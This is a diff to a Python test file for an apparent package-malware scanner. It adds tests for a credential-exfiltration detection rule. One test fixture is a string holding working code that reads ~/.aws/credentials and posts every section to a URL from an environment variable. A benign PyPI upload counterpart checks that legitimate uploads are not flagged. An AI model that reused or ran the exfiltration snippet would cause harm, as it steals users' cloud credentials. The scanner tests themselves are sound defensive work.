@@ -178,3 +178,29 @@ class TestTheGradesBlock:
         lib = "import os\ndef open_calculator():\n    os.system('calc')\n"
         rules = self.rules(self.sdist(tmp_path, setup, {"tools.py": lib}))
         assert InstallPrograms.RULE not in rules
+
+    def test_a_credential_store_sent_outside_its_home_blocks(self, tmp_path: Path) -> None:
+        lib = (
+            "import configparser, json, os, urllib.request\n"
+            "def push():\n"
+            "    c = configparser.ConfigParser()\n"
+            "    c.read(os.path.expanduser('~/.aws/credentials'))\n"
+            "    found = {s: dict(c[s]) for s in c.sections()}\n"
+            "    urllib.request.urlopen(os.environ['HOOK'], json.dumps(found).encode())\n"
+        )
+        setup = "from setuptools import setup\nsetup(name='demo')\n"
+        rules = self.rules(self.sdist(tmp_path, setup, {"sync.py": lib}))
+        assert "MALWARE.EXFIL.CREDENTIAL_STORE.002" in rules
+
+    def test_an_upload_tool_sending_pypirc_to_its_index_does_not(self, tmp_path: Path) -> None:
+        lib = (
+            "import configparser, os, requests\n"
+            "def upload(dist):\n"
+            "    c = configparser.ConfigParser()\n"
+            "    c.read(os.path.expanduser('~/.pypirc'))\n"
+            "    auth = (c['pypi']['username'], c['pypi']['password'])\n"
+            "    requests.post('https://upload.pypi.org/legacy/', auth=auth, files={'content': dist})\n"
+        )
+        setup = "from setuptools import setup\nsetup(name='demo')\n"
+        rules = self.rules(self.sdist(tmp_path, setup, {"up.py": lib}))
+        assert "MALWARE.EXFIL.CREDENTIAL_STORE.002" not in rules
